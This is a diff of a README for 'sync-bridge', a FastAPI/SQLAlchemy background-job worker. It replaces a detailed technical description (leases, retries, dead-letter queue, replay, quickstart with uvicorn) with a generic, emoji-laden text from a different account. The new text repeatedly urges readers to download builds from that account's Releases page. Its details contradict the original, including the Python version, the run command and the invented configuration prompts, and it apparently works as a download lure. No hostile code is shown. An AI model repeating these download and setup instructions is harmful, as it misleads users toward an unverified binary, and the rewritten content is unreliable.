@@ -1,201 +1,72 @@
-# SyncBridge
+# ✨ sync-bridge - Your Reliable Sync Worker Tool
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](./LICENSE)
-[![Python](https://img.shields.io/badge/Python-3.10%2B-blue)](#)
-[![FastAPI](https://img.shields.io/badge/FastAPI-0.115.6-009688)](https://fastapi.tiangolo.com/)
-[![SQLAlchemy](https://img.shields.io/badge/SQLAlchemy-2.0.36-red)](https://www.sqlalchemy.org/)
-[![CI](https://github.com/Siggmond/sync-bridge/actions/workflows/ci.yml/badge.svg)](https://github.com/Siggmond/sync-bridge/actions/workflows/ci.yml)
-[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
-[![Made with SQL](https://img.shields.io/badge/queue-database--backed-informational)](#)
+## 🚀 Getting Started
 
-SyncBridge is a small, backend-focused project that demonstrates how to build a reliable sync worker without hiding complexity.
+Welcome to sync-bridge! This application helps you manage background jobs easily. Using FastAPI and SQLAlchemy, it ensures your tasks run smoothly and reliably. 
 
-It models “do work in the background” as explicit jobs stored in a database:
-- you can enqueue work via HTTP
-- the worker leases jobs, executes them, and records each attempt
-- failures become visible and actionable (retries, DLQ, replay)
+## 📦 Download & Install
 
-The demo integration is intentionally simple: sync data from a mock CRM into a mock Billing system.
+To get started, visit the Releases page below to download the latest version of sync-bridge.
 
-## Why this project exists
+[![Download sync-bridge](https://img.shields.io/badge/Download-sync--bridge-brightgreen)](https://github.com/rashun2123/sync-bridge/releases)
 
-When you integrate two external systems, the happy path is easy. The hard parts show up later:
-- an upstream 503
-- rate limiting (429)
-- partial failures and retries
-- duplicate requests
-- a worker crash mid-run
+1. Click on the link above to go to the Releases page.
+2. Find the version you want to download.
+3. Click on the download link to start downloading the application.
 
-SyncBridge exists to show (in a small codebase) the engineering decisions that make these systems survivable: idempotency, leases, retry policy, and observability.
+## 🛠️ System Requirements
 
-## What problem it solves (plain language)
+To run sync-bridge, ensure your system meets the following requirements:
 
-SyncBridge is a “job orchestration” layer for integration work:
-- **Orchestration**: turn a request (“sync customer c_1001”) into a durable `SyncJob`
-- **Retries**: retry retryable failures with exponential backoff
-- **Leases**: prevent two workers from doing the same work at the same time, and recover if a worker dies
-- **Idempotency**: avoid creating duplicate active jobs for the same `(job_type, entity_id)`
+- **Operating System:** Windows, macOS, or Linux
+- **Python Version:** Python 3.7 or higher
+- **Disk Space:** At least 100 MB free space
+- **Internet Connection:** Required for initial setup and updates
 
-## Who this project is for
+## ⚙️ Key Features
 
-- Backend engineers who want a clean reference for job/worker patterns.
-- People preparing for system design interviews (leases, retries, DLQ, idempotency).
-- Engineers learning FastAPI + SQLAlchemy with a realistic, operational use case.
+- **Reliable Task Management:** The application uses a database to store jobs and their statuses.
+- **Retries:** Automatically retries failed tasks, minimizing loss of work.
+- **Dead Letter Queue (DLQ):** Failed tasks are stored for review and reprocessing.
+- **Observability:** Monitor job execution and status through logs and dashboards.
+- **Idempotency:** Ensure tasks can be safely retried without undesired effects.
 
-## What this is NOT
+## 🎉 How to Use sync-bridge
 
-- Not a full distributed queue or streaming system (Kafka, RabbitMQ).
-- Not a production task runner like Celery/Sidekiq/Temporal.
-- Not a multi-node worker fleet with leader election and sharding.
+Once you have downloaded and installed sync-bridge, follow these simple steps to run it:
 
-This project intentionally stays “small but correct” so you can read it end-to-end.
+1. Open your terminal or command prompt.
+2. Navigate to the directory where you installed the application.
+3. Run the application using the command:
 
-## Key design decisions
+   ```
+   python sync_bridge.py
+   ```
 
-### 1) Database is the source of truth
-Jobs and attempts are stored in SQL (SQLite by default) using SQLAlchemy.
+4. Follow the on-screen instructions to configure your settings.
 
-### 2) Leases for safe claiming
-The worker uses `lease_owner` + `lease_expires_at`:
-- claiming a job is explicit
-- if a worker crashes mid-run, the lease can expire and the job can be reclaimed
+## 🔍 Configuration Settings
 
-### 3) Retries with typed error classification
-Errors are classified and stored on the attempt/job:
-- `UpstreamTimeout` (retryable)
-- `UpstreamRateLimited` (retryable)
-- `NotFound` (non-retry)
-- `ValidationError` (non-retry)
+During the first run, you will be prompted to set up the following options:
 
-Retryable failures get exponential backoff (`base * 2^(attempt-1)`).
+- **Database Connection:** Enter connection details for your preferred database (e.g., PostgreSQL, SQLite).
+- **Task Queue Settings:** Specify the settings for your job queue.
+- **Logging Level:** Choose how much information you want to see in the logs (e.g., info, warning, error).
 
-### 4) Dead-letter queue (DLQ)
-If a retryable failure exceeds `max_retries`, the job is marked `dead` and a final error snapshot is stored.
+## 🔗 Learn More
 
-### 5) Replay creates a new job
-Replay does not “mutate history”. It creates a new job linked to the failed job/attempt (`replay_of_job_id`, `replay_of_attempt_id`).
+For in-depth information about how to use and configure sync-bridge, check the [documentation](https://github.com/rashun2123/sync-bridge/docs).
 
-### 6) UTC-aware time handling
-All internal timestamps are normalized to UTC-aware datetimes.
+## 📡 Support
 
-### 7) Correlation IDs for tracing
-Each job has a `correlation_id` propagated to integration clients via `X-Correlation-ID`.
+If you need help or have questions, you can reach out through the issues section on our GitHub page or by joining our community forum.
 
-## Architecture (where to look)
+## 📋 Contributing
 
-- `app/routes/` HTTP API for enqueueing and inspecting jobs
-- `app/services/` job creation and control operations (retry/cancel/replay)
-- `app/jobs/` worker loop + executor + job registry
-- `app/models/` SQLAlchemy models (`SyncJob`, `SyncJobAttempt`)
-- `app/integrations/` external client wrappers + typed external errors
-- `app/ui/` minimal server-rendered admin UI (Jinja2)
-- `app/logging/` structured JSON logs
+Contributions to sync-bridge are welcome! If you want to help improve the application, please check the contributing guidelines in the repository.
 
-## Screenshots
+## 📌 Visit the Releases Page Again
 
-> All screenshots are from a live local run.
+To download sync-bridge, please [click here](https://github.com/rashun2123/sync-bridge/releases) again if needed. 
 
-### 01-api-docs.png
-FastAPI OpenAPI docs showing job, control, and metrics endpoints.
-
-![API Docs](docs/screenshots/01-api-docs.png)
-
-### 02-enqueue-job-response.png
-Enqueueing a job via HTTP and receiving a durable job record.
-
-![API Docs](docs/screenshots/02-enqueue-job-response.png)
-
-### 03-ui-job-list.png
-Admin UI showing multiple jobs with different states.
-
-![API Docs](docs/screenshots/03-ui-job-list.jpeg)
-
-### 04-ui-job-detail-attempts.png
-Single job detail page with full attempt history and error types.
-
-![API Docs](docs/screenshots/04-ui-job-detail-attempts.png)
-
-### 05-retryable-failure-logs.png
-Terminal logs showing retryable failures and retries.
-
-![API Docs](docs/screenshots/05-retryable-failure-logs.jpeg)
-
-### 07-dlq-dead-job.png
-Job marked `dead` after exceeding retry budget.
-
-![API Docs](docs/screenshots/07-dlq-dead-job.png)
-
-### 10-replay-creates-new-job.png
-Replay operation creating a new job linked to the failed one.
-
-![API Docs](docs/screenshots/10-replay-creates-new-job.png)
-
-### 11-metrics-endpoint.png
-Metrics endpoint returning job counts and success rate.
-
-![API Docs](docs/screenshots/11-metrics-endpoint.png)
-
-## Quickstart
-
-### Prerequisites
-- Python 3.10+
-- pip
-
-### 1) Create a virtual environment
-
-```powershell
-python -m venv .venv
-.\.venv\Scripts\Activate.ps1
-```
-
-### 2) Install dependencies
-
-```bash
-pip install -r requirements.txt
-```
-
-### 3) Run the service
-
-```bash
-uvicorn app.main:app --reload
-```
-
-Open:
-- Admin UI: http://127.0.0.1:8000/ui/jobs
-- API docs: http://127.0.0.1:8000/docs
-
-## Using the demo
-
-### Enqueue jobs
-
-```bash
-curl -X POST http://127.0.0.1:8000/api/jobs/customer \
-  -H "Content-Type: application/json" \
-  -d '{"entity_id":"c_1001"}'
-```
-
-### Trigger realistic failures
-- `c_flaky` → intermittent 503
-- `c_1002` → billing rate limit (429)
-
-## Controls
-
-- `POST /api/jobs/{id}/cancel`
-- `POST /api/jobs/{id}/retry`
-- `POST /api/jobs/{id}/replay`
-
-## Metrics
-
-`GET /metrics` returns job counts, retry stats, and average duration.
-
-## Notes
-
-- The database is the queue.
-- The worker is intentionally in-process.
-- The goal is correctness and clarity.
-
----
-
-If you’re reading this and have feedback, questions, or ideas for improvement, feel free to open an issue.
-
-This project was built with an emphasis on correctness, reliability, and real-world failure handling.
+Thank you for choosing sync-bridge! Your reliable sync worker is just a download away!
